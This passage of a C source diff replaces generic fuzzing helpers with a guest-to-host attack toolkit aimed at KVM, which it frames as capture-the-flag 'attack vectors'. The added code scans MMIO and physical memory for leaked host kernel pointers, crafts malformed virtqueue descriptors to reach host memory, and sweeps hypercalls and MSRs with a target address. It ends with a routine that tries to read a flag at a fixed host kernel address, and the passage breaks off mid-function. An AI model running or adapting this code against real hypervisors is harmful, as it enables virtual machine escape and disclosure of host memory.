-            desc.next_idx = (desc.index + 1) % (max_index + 1);
-        } else {
-            /* circular chains */
-            int base = (i % (max_index + 1));
-            if (i % 3 == 0) {
-                desc.index = base;
-                desc.phys_addr = 0x1000 + base * 0x1000;
-                desc.len = 0x100;
-                desc.flags = 1;
-                desc.next_idx = (base + 1) % (max_index + 1);
-            } else if (i % 3 == 1) {
-                desc.index = (base + 1) % (max_index + 1);
-                desc.phys_addr = 0x2000 + base * 0x1000;
-                desc.len = 0x200;
-                desc.flags = 1;
-                desc.next_idx = (base + 2) % (max_index + 1);
-            } else {
-                desc.index = (base + 2) % (max_index + 1);
-                desc.phys_addr = 0x3000 + base * 0x1000;
-                desc.len = 0x300;
-                desc.flags = 1;
-                desc.next_idx = base;
-            }
-        }
-
-        if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc) < 0) {
-            safe_log(vq_fuzz_log, "[%d] IOCTL_WRITE_VQ_DESC failed idx=%u err=%s\n",
-                     i, desc.index, strerror(errno));
-        } else {
-            safe_log(vq_fuzz_log, "[%d] wrote desc idx=%u pa=0x%llx len=0x%x flags=0x%x next=%u\n",
-                     i, desc.index, (unsigned long long)desc.phys_addr, desc.len, desc.flags, desc.next_idx);
-        }
-
-        if (trigger_every > 0 && (i % trigger_every) == 0) {
-            long ret = 0;
-            if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) == 0) {
-                safe_log(vq_fuzz_log, "[%d] trigger_hypercall ret=%ld\n", i, ret);
-            } else {
-                safe_log(vq_fuzz_log, "[%d] trigger_hypercall failed: %s\n", i, strerror(errno));
-            }
-        }
-    }
-
-    free_vq_page();
-    safe_log(vq_fuzz_log, "=== vq_fuzz end ===\n");
-}
-
-void dma_probe(int pages, int pattern, int trigger) {
-    if (pages <= 0 || pages > 16) pages = 8;
-    if (!dma_probe_log) {
-        dma_probe_log = fopen("dma_probe.log", "a");
-        if (!dma_probe_log) {
-            perror("dma_probe: fopen");
-            return;
-        }
-    }
-
-    safe_log(dma_probe_log, "=== dma_probe start: pages=%d pattern=%d trigger=%d ===\n",
-             pages, pattern, trigger);
-
-    unsigned long phys_addrs[16] = {0};
-    if (ioctl(fd, IOCTL_ALLOC_ROOT_PAGES, phys_addrs) != 0) {
-        safe_log(dma_probe_log, "ALLOC_ROOT_PAGES ioctl failed: %s\n", strerror(errno));
-        return;
-    }
-
-    safe_log(dma_probe_log, "Allocated physical pages:\n");
-    for (int i = 0; i < pages; i++) {
-        safe_log(dma_probe_log, "  [%d] phys = 0x%lx\n", i, phys_addrs[i]);
-    }
-
-    for (int i = 0; i < pages; i++) {
-        unsigned long phys = phys_addrs[i];
-        unsigned char buf[4096];
-        if (pattern == 0) {
-            for (int j = 0; j < 4096; j++) buf[j] = (unsigned char)((i + j) & 0xff);
-        } else if (pattern == 1) {
-            memset(buf, 0x41, sizeof(buf));
-        } else {
-            for (int j = 0; j < 4096; j++) buf[j] = (unsigned char)(rand() & 0xff);
-        }
-
-        struct physical_rw req = {
-            .phys_addr = phys,
-            .size = sizeof(buf),
-            .user_buffer = buf
-        };
-
-        if (ioctl(fd, IOCTL_WRITE_PHYSICAL, &req) != 0) {
-            safe_log(dma_probe_log, "WRITE_PHYSICAL failed for phys 0x%lx: %s\n", phys, strerror(errno));
-        } else {
-            safe_log(dma_probe_log, "WROTE pattern to phys 0x%lx\n", phys);
-        }
-    }
-
-    alloc_vq_page();
-    for (int i = 0; i < pages; i++) {
-        struct vq_desc_user_data desc = {
-            .index = (uint16_t)(i & 0xff),
-            .phys_addr = (uint64_t)phys_addrs[i],
-            .len = 4096,
-            .flags = 0,
-            .next_idx = (uint16_t)((i + 1) & 0xff)
-        };
-        if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc) != 0) {
-            safe_log(dma_probe_log, "WRITE_VQ_DESC failed for desc %d: %s\n", i, strerror(errno));
-        } else {
-            safe_log(dma_probe_log, "WROTE VQ desc idx=%u -> phys=0x%llx\n", desc.index, (unsigned long long)desc.phys_addr);
-        }
-    }
-
-    if (trigger) {
-        long ret;
-        if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) == 0) {
-            safe_log(dma_probe_log, "Trigger hypercall returned %ld\n", ret);
-        } else {
-            safe_log(dma_probe_log, "Trigger hypercall failed: %s\n", strerror(errno));
-        }
-    }
-
-    free_vq_page();
-    safe_log(dma_probe_log, "=== dma_probe end ===\n");
-}
-
-void msr_fuzz(unsigned int start, unsigned int end, unsigned int patterns_mask) {
-    if (!msr_fuzz_log) {
-        msr_fuzz_log = fopen("msr_fuzz.log", "a");
-        if (!msr_fuzz_log) {
-            perror("msr_fuzz: fopen");
-            return;
-        }
-    }
-
-    safe_log(msr_fuzz_log, "=== msr_fuzz start: start=0x%x end=0x%x patterns_mask=0x%x ===\n",
-             start, end, patterns_mask);
-
-    for (unsigned int msr = start; msr <= end; msr++) {
-        unsigned long long before = 0;
-        struct msr_data rreq = { .msr = msr, .value = 0 };
-        if (ioctl(fd, IOCTL_READ_MSR, &rreq) == 0) {
-            before = rreq.value;
-        } else {
-            safe_log(msr_fuzz_log, "MSR 0x%x read failed: %s\n", msr, strerror(errno));
-            continue;
-        }
-
-        safe_log(msr_fuzz_log, "MSR 0x%x before=0x%llx\n", msr, before);
-
-        unsigned long long patterns[4];
-        patterns[0] = 0ULL;
-        patterns[1] = ~0ULL;
-        patterns[2] = 0xdeadbeefdeadbeefULL;
-        patterns[3] = ((unsigned long long)rand() << 32) ^ rand();
-
-        for (int p = 0; p < 4; p++) {
-            if (!(patterns_mask & (1u << p))) continue;
-            struct msr_data wreq = { .msr = msr, .value = patterns[p] };
-            if (ioctl(fd, IOCTL_WRITE_MSR, &wreq) != 0) {
-                safe_log(msr_fuzz_log, "MSR 0x%x write pattern %d failed: %s\n", msr, p, strerror(errno));
-            } else {
-                struct msr_data r2 = { .msr = msr, .value = 0 };
-                if (ioctl(fd, IOCTL_READ_MSR, &r2) == 0) {
-                    safe_log(msr_fuzz_log, "MSR 0x%x wrote 0x%llx readback 0x%llx\n", msr, patterns[p], r2.value);
-                } else {
-                    safe_log(msr_fuzz_log, "MSR 0x%x readback failed after write: %s\n", msr, strerror(errno));
+/*
+ * Probe MMIO regions looking for host memory leaks.
+ * Some KVM device emulation bugs can leak host pointers.
+ */
+void probe_mmio_for_host_leaks(void) {
+    safe_log("\n=== MMIO HOST LEAK PROBE ===\n");
+    
+    /* Common MMIO regions to probe */
+    struct {
+        unsigned long base;
+        unsigned long size;
+        const char *name;
+    } regions[] = {
+        { 0xfeb00000, 0x1000, "virtio-mmio-0" },
+        { 0xfeb01000, 0x1000, "virtio-mmio-1" },
+        { 0xfeb02000, 0x1000, "virtio-mmio-2" },
+        { 0xfea00000, 0x1000, "pci-mmio-low" },
+        { 0xfe000000, 0x1000, "pci-mmio-base" },
+        { 0xfec00000, 0x1000, "ioapic" },
+        { 0xfee00000, 0x1000, "lapic" },
+        { 0xfed00000, 0x1000, "hpet" },
+        { 0, 0, NULL }
+    };
+    
+    unsigned char buf[4096];
+    
+    for (int i = 0; regions[i].name != NULL; i++) {
+        safe_log("[*] Probing %s at 0x%lx...\n", regions[i].name, regions[i].base);
+        
+        memset(buf, 0, sizeof(buf));
+        if (read_mmio(regions[i].base, buf, regions[i].size) == 0) {
+            /* Scan for host kernel pointers */
+            for (size_t off = 0; off <= regions[i].size - 8; off += 8) {
+                unsigned long value = *(unsigned long *)(buf + off);
+                if (looks_like_host_kernel_ptr(value)) {
+                    char source[64];
+                    snprintf(source, sizeof(source), "%s+0x%lx", regions[i].name, off);
+                    record_host_leak(regions[i].base + off, value, source, 5);
                 }
             }
-        }
-
-        struct msr_data restore = { .msr = msr, .value = before };
-        ioctl(fd, IOCTL_WRITE_MSR, &restore);
-    }
-
-    safe_log(msr_fuzz_log, "=== msr_fuzz end ===\n");
-}
-
-/* ========================================================================
- * CRASH MONITOR
- * ======================================================================== */
-
-static void *crash_monitor_thread(void *arg) {
-    FILE *fp;
-    char buf[4096];
-    crash_monitor_running = 1;
-
-    fp = popen("dmesg -w", "r");
-    if (!fp) {
-        perror("crash_monitor: popen dmesg -w");
-        crash_monitor_running = 0;
-        return NULL;
-    }
-
-    FILE *out = fopen("kvm_probe_dmesg.log", "a");
-    if (!out) out = fp;
-
-    while (crash_monitor_running && fgets(buf, sizeof(buf), fp) != NULL) {
-        if (out && out != fp) {
-            fprintf(out, "%s", buf);
-            fflush(out);
         } else {
-            printf("[dmesg] %s", buf);
+            safe_log("[-] Failed to read %s\n", regions[i].name);
         }
-
-        if (strstr(buf, "BUG:") || strstr(buf, "Oops:") || strstr(buf, "Kernel panic") ||
-            strstr(buf, "KASAN:") || strstr(buf, "Call Trace") ) {
-            printf("[!] DETECTED kernel OOPS/BUG/PANIC line: %s", buf);
-            if (out) {
-                fprintf(out, "[!] ALERT: %s", buf);
-                fflush(out);
-            }
-        }
-    }
-
-    if (out && out != fp) fclose(out);
-    pclose(fp);
-    crash_monitor_running = 0;
-    return NULL;
-}
-
-void start_crash_monitor(void) {
-    if (crash_monitor_running) {
-        printf("[!] crash_monitor already running\n");
-        return;
-    }
-    if (pthread_create(&crash_thread, NULL, crash_monitor_thread, NULL) != 0) {
-        perror("start_crash_monitor: pthread_create");
-        return;
-    }
-    printf("[+] crash_monitor started (logging to kvm_probe_dmesg.log)\n");
-}
-
-void stop_crash_monitor(void) {
-    if (!crash_monitor_running) {
-        printf("[!] crash_monitor not running\n");
-        return;
-    }
-    crash_monitor_running = 0;
-    pthread_kill(crash_thread, SIGINT);
-    pthread_join(crash_thread, NULL);
-    printf("[+] crash_monitor stopped\n");
-}
-
-/* ========================================================================
- * V2P FAST SCANNER
- * ======================================================================== */
-
-void virt_to_phys_scan_fast(unsigned long target_phys, unsigned long start_va, 
-                            unsigned long end_va, unsigned long step, unsigned long progress_every) {
-    printf("[+] Fast scanning virtual range 0x%lx-0x%lx for physical 0x%lx (step: 0x%lx)\n",
-           start_va, end_va, target_phys, step);
-
-    unsigned long current_va = start_va;
-    int found = 0;
-    unsigned long iter = 0;
-
-    while (current_va <= end_va) {
-        unsigned long test_va = current_va;
-        if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &test_va) == 0) {
-            if (test_va == target_phys) {
-                printf("[+] FOUND: Virtual 0x%lx -> Physical 0x%lx\n", current_va, test_va);
-                found++;
-            }
-        }
-        iter++;
-        if (progress_every && (iter % progress_every) == 0) {
-            printf("[.] Progress: scanned %lu addresses, current_va=0x%lx\n", iter, current_va);
-        }
-        current_va += step;
-    }
-
-    if (!found) {
-        printf("[-] No virtual addresses found mapping to physical 0x%lx\n", target_phys);
-    } else {
-        printf("[+] Found %d virtual address(es) mapping to physical 0x%lx\n", found, target_phys);
     }
 }
 
 /* ========================================================================
- * SECTION 6: ADAPTIVE LEAK FUZZING (NEW)
+ * CTF ATTACK VECTOR 2: VIRTQUEUE DMA CONFUSION
  * ======================================================================== */
 
-/* Adaptive VQ fuzzing with leak detection */
-void adaptive_vq_leak_fuzz(int max_iterations, int starting_corruption) {
-    if (!leak_log) {
-        leak_log = fopen("adaptive_leak.log", "a");
-        if (!leak_log) {
-            perror("Failed to open leak log");
-            return;
-        }
+/*
+ * Attempt to confuse virtqueue processing to access host memory.
+ * The idea is to set up descriptors pointing to host physical addresses.
+ */
+void virtqueue_host_memory_attack(unsigned long target_host_addr) {
+    safe_log("\n=== VIRTQUEUE HOST MEMORY ATTACK ===\n");
+    safe_log("[*] Target host address: 0x%lx\n", target_host_addr);
+    
+    /* Allocate VQ page */
+    unsigned long pfn = alloc_vq_page();
+    if (!pfn) {
+        safe_log("[-] Failed to allocate VQ page\n");
+        return;
     }
+    safe_log("[+] VQ page PFN: 0x%lx (phys: 0x%lx)\n", pfn, pfn << 12);
     
-    printf("=== ADAPTIVE LEAK FUZZER ===\n");
-    printf("[+] Starting with corruption level: %d\n", starting_corruption);
-    printf("[+] Max iterations: %d\n", max_iterations);
-    printf("[+] Monitoring for kernel pointer leaks...\n\n");
-    
-    safe_log(leak_log, "=== adaptive_vq_leak_fuzz start: max_iter=%d corruption=%d ===\n",
-             max_iterations, starting_corruption);
-    
-    int corruption_level = starting_corruption;
-    int phase = 1;
-    
-    while (corruption_level <= 100 && phase <= 10) {
-        printf("\n[PHASE %d] Corruption Level: %d%%\n", phase, corruption_level);
-        safe_log(leak_log, "\n[PHASE %d] Corruption Level: %d%%\n", phase, corruption_level);
-        
-        /* Allocate VQ page */
-        alloc_vq_page();
-        
-        int iterations_this_phase = max_iterations / 10;
-        int leaks_this_phase = 0;
-        
-        for (int i = 0; i < iterations_this_phase; i++) {
-            struct vq_desc_user_data desc;
-            memset(&desc, 0, sizeof(desc));
-            
-            /* Apply corruption based on level */
-            if (rand() % 100 < corruption_level) {
-                /* Corrupted descriptor */
-                desc.index = rand() % 256;
-                
-                /* Gradually increase address corruption */
-                if (corruption_level < 30) {
-                    /* Mild: Small offsets */
-                    desc.phys_addr = 0x1000 + (rand() % 0x10000);
-                } else if (corruption_level < 60) {
-                    /* Medium: Larger ranges */
-                    desc.phys_addr = (rand() % 0x100000);
-                } else {
-                    /* Aggressive: Full random */
-                    desc.phys_addr = ((uint64_t)rand() << 32) ^ rand();
-                }
-                
-                /* Length corruption increases with level */
-                if (corruption_level < 40) {
-                    desc.len = rand() % 4096;
-                } else if (corruption_level < 70) {
-                    desc.len = rand() % 0x10000;
-                } else {
-                    desc.len = (uint32_t)rand();
-                }
-                
-                desc.flags = (rand() % 100 < corruption_level) ? rand() & 0xffff : 0;
-                desc.next_idx = rand() % 256;
-            } else {
-                /* Valid descriptor */
-                desc.index = i % 256;
-                desc.phys_addr = 0x1000 + (i * 0x1000);
-                desc.len = 0x1000;
-                desc.flags = 0;
-                desc.next_idx = (i + 1) % 256;
-            }
-            
-            if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc) < 0) {
-                safe_log(leak_log, "[%d] WRITE_VQ_DESC failed: %s\n", i, strerror(errno));
-            }
-            
-            /* Trigger every 10 operations */
-            if (i % 10 == 0) {
-                long ret;
-                if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) < 0) {
-                    safe_log(leak_log, "[%d] Hypercall failed, system may be unstable\n", i);
-                    goto cleanup_phase;
-                }
-                
-                /* Check for leaks in nearby memory */
-                if (desc.phys_addr > 0 && desc.phys_addr < 0x100000000UL) {
-                    int found = safe_read_with_leak_check(desc.phys_addr, 
-                                                          min(desc.len, 4096), 
-                                                          "vq_corruption");
-                    if (found > 0) {
-                        leaks_this_phase += found;
-                        printf("[+] Found %d leaks after corruption at index %d\n", found, i);
-                    }
-                }
-                
-                /* Health check every 50 iterations */
-                if (i % 50 == 0) {
-                    if (!check_system_health()) {
-                        printf("[!] System health check FAILED - stopping fuzzing\n");
-                        safe_log(leak_log, "[!] System health check FAILED at iteration %d\n", i);
-                        goto cleanup_phase;
-                    }
-                }
-            }
-            
-            /* Small delay to prevent overwhelming the system */
-            usleep(1000); /* 1ms */
-        }
-        
-cleanup_phase:
+    /* Allocate pages for reading results */
+    unsigned long phys_pages[8] = {0};
+    if (ioctl(fd, IOCTL_ALLOC_ROOT_PAGES, phys_pages) != 0) {
+        safe_log("[-] Failed to allocate result pages\n");
         free_vq_page();
-        
-        printf("[PHASE %d] Complete - Found %d potential leaks\n", phase, leaks_this_phase);
-        safe_log(leak_log, "[PHASE %d] Complete - Found %d potential leaks\n", 
-                phase, leaks_this_phase);
-        
-        if (leaks_this_phase > 0) {
-            printf("[+] SUCCESS! Found leaks at corruption level %d%%\n", corruption_level);
-            printf("[+] Continuing to next phase to find more...\n");
-        }
-        
-        /* Check system health before continuing */
-        if (!check_system_health()) {
-            printf("[!] System unstable - stopping\n");
-            break;
-        }
-        
-        /* Increase corruption for next phase */
-        corruption_level += 10;
-        phase++;
-        
-        /* Brief pause between phases */
-        sleep(1);
+        return;
     }
+    
+    safe_log("[+] Result pages allocated:\n");
+    for (int i = 0; i < 8 && phys_pages[i]; i++) {
+        safe_log("    [%d] 0x%lx\n", i, phys_pages[i]);
+    }
+    
+    /*
+     * Strategy: Create a descriptor chain that might confuse KVM's
+     * virtqueue processing into accessing host memory.
+     * 
+     * We try various address transformations that might bypass
+     * guest physical address validation.
+     */
+    
+    /* Attempt 1: Direct host address (unlikely to work but try) */
+    safe_log("[*] Attempt 1: Direct host address in descriptor\n");
+    write_vq_desc(0, target_host_addr, 64, 0, 1);
+    write_vq_desc(1, phys_pages[0], 64, 0, 0);
+    trigger_hypercall();
+    
+    /* Check if anything was written to our result page */
+    unsigned char result[256];
+    if (read_physical(phys_pages[0], result, sizeof(result)) == 0) {
+        int nonzero = 0;
+        for (int i = 0; i < 256; i++) {
+            if (result[i]) nonzero++;
+        }
+        if (nonzero > 0) {
+            safe_log("[!] Result page has %d non-zero bytes!\n", nonzero);
+            hexdump(result, phys_pages[0], 256);
+        }
+    }
+    
+    /* Attempt 2: Use large length to overflow bounds checks */
+    safe_log("[*] Attempt 2: Length overflow attack\n");
+    write_vq_desc(0, 0x1000, 0xffffffff, 1, 1);  /* VRING_DESC_F_NEXT */
+    write_vq_desc(1, phys_pages[1], 4096, 0, 0);
+    trigger_hypercall();
+    
+    /* Attempt 3: Circular descriptor chain */
+    safe_log("[*] Attempt 3: Circular chain confusion\n");
+    write_vq_desc(0, 0x1000, 0x1000, 1, 1);
+    write_vq_desc(1, 0x2000, 0x1000, 1, 2);
+    write_vq_desc(2, 0x3000, 0x1000, 1, 0);  /* Points back to 0 */
+    trigger_hypercall();
+    
+    /* Attempt 4: Physical address near RAM boundary */
+    safe_log("[*] Attempt 4: RAM boundary addresses\n");
+    /* Guest RAM typically ends somewhere, try addresses past it */
+    unsigned long test_addrs[] = {
+        0x100000000UL,     /* 4GB */
+        0x200000000UL,     /* 8GB */
+        0x80000000UL,      /* 2GB */
+        0x40000000UL,      /* 1GB */
+        0x3fff0000UL,      /* Just under 1GB */
+        0
+    };
+    
+    for (int i = 0; test_addrs[i]; i++) {
+        write_vq_desc(0, test_addrs[i], 4096, 1, 1);
+        write_vq_desc(1, phys_pages[2], 4096, 0, 0);
+        trigger_hypercall();
+        
+        if (read_physical(phys_pages[2], result, 256) == 0) {
+            int nonzero = 0;
+            for (int j = 0; j < 256; j++) {
+                if (result[j]) nonzero++;
+            }
+            if (nonzero > 10) {
+                safe_log("[!] Interesting data from addr 0x%lx!\n", test_addrs[i]);
+                hexdump(result, phys_pages[2], 256);
+            }
+        }
+        memset(result, 0, sizeof(result));
+        write_physical(phys_pages[2], result, 256);
+    }
+    
+    free_vq_page();
+    safe_log("[*] VQ attack sequence complete\n");
+}
+
+/* ========================================================================
+ * CTF ATTACK VECTOR 3: HYPERCALL EXPLOITATION
+ * ======================================================================== */
+
+/*
+ * Try various hypercalls that might leak or access host memory.
+ * KVM has had bugs where hypercalls could leak host pointers.
+ */
+void hypercall_exploitation(unsigned long target_addr) {
+    safe_log("\n=== HYPERCALL EXPLOITATION ===\n");
+    
+    /* Standard KVM hypercall numbers */
+    unsigned long hcalls[] = {
+        0,                  /* KVM_HC_VAPIC_POLL_IRQ */
+        1,                  /* KVM_HC_MMU_OP (deprecated) */
+        2,                  /* KVM_HC_FEATURES */
+        3,                  /* KVM_HC_PPC_MAP_MAGIC_PAGE */
+        4,                  /* KVM_HC_KICK_CPU */
+        5,                  /* KVM_HC_MIPS_GET_CLOCK_FREQ */
+        6,                  /* KVM_HC_MIPS_EXIT_VM */
+        7,                  /* KVM_HC_MIPS_CONSOLE_OUTPUT */
+        8,                  /* KVM_HC_CLOCK_PAIRING */
+        9,                  /* KVM_HC_SEND_IPI */
+        10,                 /* KVM_HC_SCHED_YIELD */
+        11,                 /* KVM_HC_MAP_GPA_RANGE */
+        /* Extended/experimental hypercalls */
+        100, 101, 102, 103, 104, 105,
+        0x80000000,         /* Potential vendor hypercalls */
+        0x80000001,
+        0xffffffff,
+    };
+    
+    for (size_t i = 0; i < sizeof(hcalls)/sizeof(hcalls[0]); i++) {
+        long ret;
+        
+        /* Try hypercall with target address as argument */
+        ret = do_hypercall(hcalls[i], target_addr, 0, 0, 0);
+        if (ret != 0 && ret != -1 && ret != -1000) {
+            safe_log("[!] Hypercall %lu with target addr returned: %ld (0x%lx)\n",
+                     hcalls[i], ret, (unsigned long)ret);
+            
+            if (looks_like_host_kernel_ptr((unsigned long)ret)) {
+                record_host_leak(0, (unsigned long)ret, "hypercall_return", 7);
+            }
+        }
+        
+        /* Try with address as different arguments */
+        ret = do_hypercall(hcalls[i], 0, target_addr, 0, 0);
+        ret = do_hypercall(hcalls[i], 0, 0, target_addr, 0);
+        ret = do_hypercall(hcalls[i], 0, 0, 0, target_addr);
+        
+        /* Try with small values that might index into host structures */
+        for (int j = 0; j < 256; j += 16) {
+            ret = do_hypercall(hcalls[i], j, 0, 0, 0);
+            if (looks_like_host_kernel_ptr((unsigned long)ret)) {
+                safe_log("[!] Hypercall %lu(%d) leaked: 0x%lx\n", 
+                         hcalls[i], j, (unsigned long)ret);
+                record_host_leak(0, (unsigned long)ret, "hypercall_indexed", 6);
+            }
+        }
+    }
+}
+
+/* ========================================================================
+ * CTF ATTACK VECTOR 4: MSR-BASED ATTACKS
+ * ======================================================================== */
+
+/*
+ * Some MSRs in KVM can leak host information or provide
+ * access to host memory mappings.
+ */
+void msr_exploitation(void) {
+    safe_log("\n=== MSR EXPLOITATION ===\n");
+    
+    struct msr_data msr_req;
+    
+    /* Interesting MSRs that might leak host info */
+    unsigned int msrs[] = {
+        0x00000017,  /* IA32_PLATFORM_ID */
+        0x0000001b,  /* IA32_APIC_BASE */
+        0x0000003a,  /* IA32_FEATURE_CONTROL */
+        0x00000174,  /* IA32_SYSENTER_CS */
+        0x00000175,  /* IA32_SYSENTER_ESP */
+        0x00000176,  /* IA32_SYSENTER_EIP */
+        0x00000277,  /* IA32_PAT */
+        0xc0000080,  /* MSR_EFER */
+        0xc0000081,  /* MSR_STAR */
+        0xc0000082,  /* MSR_LSTAR */
+        0xc0000083,  /* MSR_CSTAR */
+        0xc0000084,  /* MSR_SYSCALL_MASK */
+        0xc0000100,  /* MSR_FS_BASE */
+        0xc0000101,  /* MSR_GS_BASE */
+        0xc0000102,  /* MSR_KERNEL_GS_BASE */
+        0xc0000103,  /* MSR_TSC_AUX */
+        /* KVM-specific MSRs */
+        0x4b564d00,  /* MSR_KVM_WALL_CLOCK */
+        0x4b564d01,  /* MSR_KVM_SYSTEM_TIME */
+        0x4b564d02,  /* MSR_KVM_WALL_CLOCK_NEW */
+        0x4b564d03,  /* MSR_KVM_SYSTEM_TIME_NEW */
+        0x4b564d04,  /* MSR_KVM_ASYNC_PF_EN */
+        0x4b564d05,  /* MSR_KVM_STEAL_TIME */
+        0x4b564d06,  /* MSR_KVM_PV_EOI_EN */
+        0x4b564d07,  /* MSR_KVM_POLL_CONTROL */
+        0x4b564d10,  /* MSR_KVM_ASYNC_PF_INT */
+        0x4b564d11,  /* MSR_KVM_ASYNC_PF_ACK */
+        0
+    };
+    
+    for (int i = 0; msrs[i]; i++) {
+        msr_req.msr = msrs[i];
+        msr_req.value = 0;
+        
+        if (ioctl(fd, IOCTL_READ_MSR, &msr_req) == 0) {
+            safe_log("[*] MSR 0x%08x = 0x%016llx\n", msrs[i], msr_req.value);
+            
+            if (looks_like_host_kernel_ptr(msr_req.value)) {
+                char source[32];
+                snprintf(source, sizeof(source), "msr_0x%x", msrs[i]);
+                record_host_leak(0, msr_req.value, source, 4);
+            }
+        }
+    }
+}
+
+/* ========================================================================
+ * CTF ATTACK VECTOR 5: SHARED MEMORY/COVERT CHANNEL
+ * ======================================================================== */
+
+/*
+ * Look for shared memory regions that might leak between host and guest.
+ * Also check PV clock and steal time structures.
+ */
+void shared_memory_scan(void) {
+    safe_log("\n=== SHARED MEMORY SCAN ===\n");
+    
+    unsigned char buf[4096];
+    
+    /* KVM PV clock shared page */
+    struct msr_data msr_req;
+    msr_req.msr = 0x4b564d03;  /* MSR_KVM_SYSTEM_TIME_NEW */
+    msr_req.value = 0;
+    
+    if (ioctl(fd, IOCTL_READ_MSR, &msr_req) == 0 && msr_req.value) {
+        unsigned long pv_clock_addr = msr_req.value & ~1UL;
+        safe_log("[*] PV clock at physical 0x%llx\n", (unsigned long long)pv_clock_addr);
+        
+        if (read_physical(pv_clock_addr, buf, 4096) == 0) {
+            safe_log("[+] PV clock page contents:\n");
+            hexdump(buf, pv_clock_addr, 64);
+            
+            /* Scan for pointers */
+            for (size_t off = 0; off <= 4096 - 8; off += 8) {
+                unsigned long value = *(unsigned long *)(buf + off);
+                if (looks_like_host_kernel_ptr(value)) {
+                    record_host_leak(pv_clock_addr + off, value, "pv_clock", 5);
+                }
+            }
+        }
+    }
+    
+    /* KVM steal time */
+    msr_req.msr = 0x4b564d05;  /* MSR_KVM_STEAL_TIME */
+    if (ioctl(fd, IOCTL_READ_MSR, &msr_req) == 0 && msr_req.value) {
+        unsigned long steal_time_addr = msr_req.value & ~1UL;
+        safe_log("[*] Steal time at physical 0x%llx\n", (unsigned long long)steal_time_addr);
+        
+        if (read_physical(steal_time_addr, buf, 4096) == 0) {
+            hexdump(buf, steal_time_addr, 64);
+            
+            for (size_t off = 0; off <= 4096 - 8; off += 8) {
+                unsigned long value = *(unsigned long *)(buf + off);
+                if (looks_like_host_kernel_ptr(value)) {
+                    record_host_leak(steal_time_addr + off, value, "steal_time", 5);
+                }
+            }
+        }
+    }
+}
+
+/* ========================================================================
+ * CTF ATTACK VECTOR 6: PHYSICAL MEMORY SCANNING
+ * ======================================================================== */
+
+/*
+ * Scan physical memory for patterns that might indicate host memory leaks.
+ * Guest physical memory shouldn't contain host kernel pointers.
+ */
+void scan_physical_for_host_ptrs(unsigned long start, unsigned long end, unsigned long step) {
+    safe_log("\n=== PHYSICAL MEMORY SCAN FOR HOST POINTERS ===\n");
+    safe_log("[*] Scanning 0x%lx - 0x%lx (step 0x%lx)\n", start, end, step);
+    
+    unsigned char buf[4096];
+    unsigned long addr = start;
+    int found = 0;
+    
+    while (addr < end) {
+        if (read_physical(addr, buf, 4096) == 0) {
+            for (size_t off = 0; off <= 4096 - 8; off += 8) {
+                unsigned long value = *(unsigned long *)(buf + off);
+                if (looks_like_host_kernel_ptr(value)) {
+                    char source[64];
+                    snprintf(source, sizeof(source), "phys_scan@0x%lx", addr + off);
+                    record_host_leak(addr + off, value, source, 3);
+                    found++;
+                    
+                    if (found <= 10) {
+                        safe_log("[!] Found at 0x%lx: 0x%lx\n", addr + off, value);
+                        /* Show context */
+                        size_t ctx_start = (off >= 32) ? off - 32 : 0;
+                        hexdump(buf + ctx_start, addr + ctx_start, 64);
+                    }
+                }
+            }
+        }
+        
+        addr += step;
+        
+        if ((addr - start) % 0x1000000 == 0) {
+            safe_log("[.] Progress: 0x%lx / 0x%lx\n", addr, end);
+        }
+    }
+    
+    safe_log("[*] Scan complete. Found %d potential host pointers.\n", found);
+}
+
+/* ========================================================================
+ * CTF ATTACK VECTOR 7: FLAG-SPECIFIC ATTACK
+ * ======================================================================== */
+
+/*
+ * Specifically target the flag at 0xffffffff826279a8.
+ * This tries various techniques to read from that exact address.
+ */
+void attack_flag_address(unsigned long flag_addr) {
+    safe_log("\n=== TARGETED FLAG ATTACK ===\n");
+    safe_log("[*] Target: 0x%lx\n", flag_addr);
+    
+    unsigned char result[256];
+    memset(result, 0, sizeof(result));
+    
+    /* First, check if we've found any host leaks that could help */
+    if (g_host_leak_count > 0) {
+        safe_log("[+] Analyzing %d host leaks for useful information...\n", g_host_leak_count);
+        
+        for (int i = 0; i < g_host_leak_count; i++) {
+            struct host_leak *leak = &g_host_leaks[i];
+            
+            /* Check if leak is near our target */
+            long offset = (long)(flag_addr - leak->leaked_value);
+            if (offset > -0x10000 && offset < 0x10000) {
+                safe_log("[!] Leak #%d is %ld bytes from target!\n", i, offset);
+                safe_log("    Leak addr: 0x%lx, value: 0x%lx\n", 
+                         leak->addr, leak->leaked_value);
+            }
+            
+            /* Check if this looks like a base address we could use */
+            if ((leak->leaked_value & 0xfffff) == 0) {
+                safe_log("[*] Leak #%d looks like an aligned base: 0x%lx\n",
+                         i, leak->leaked_value);
+            }
+        }
+    }
+    
+    /* Try using the write_flag IOCTL if the driver supports CTF mode */
+    unsigned long val = 0;
+    if (ioctl(fd, IOCTL_READ_FLAG_ADDR, &val) == 0 && val != 0) {
+        safe_log("[!] READ_FLAG_ADDR returned: 0x%lx\n", val);
+        
+        /* Try to read as string */
+        if (val > 0x1000) {
+            struct kvm_kernel_mem_read req = {
+                .kernel_addr = val,
+                .length = 64,
+                .user_buf = result
+            };
+            if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
+                safe_log("[+] Content at flag address:\n");
+                hexdump(result, val, 64);
+                
+                /* Check for flag format */
+                if (memcmp(result, "flag{", 5) == 0 || 
+                    memcmp(result, "CTF{", 4) == 0 ||
+                    memcmp(result, "KVMCTF{", 7) == 0) {
+                    safe_log("\n[!!!] FLAG FOUND: %s\n", result);
+                }
+            }
+        }
+    }
+    
+    /* Try various memory read techniques */
+    safe_log("[*] Trying direct kernel memory read...\n");
+    struct kvm_kernel_mem_read kmem_req = {
+        .kernel_addr = flag_addr,
+        .length = 64,
+        .user_buf = result
+    };
+    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &kmem_req) == 0) {
+        safe_log("[+] Direct read succeeded:\n");
+        hexdump(result, flag_addr, 64);
+    } else {
+        safe_log("[-] Direct kernel read failed (expected for host address)\n");
+    }
+    
+    /* Calculate possible physical address assuming linear mapping */
+    /* Host kernel text at 0xffffffff80000000 maps physical at some offset */
+    safe_log("[*] Trying physical address transformations...\n");
+    
+    /* Common host physical memory locations for kernel text */
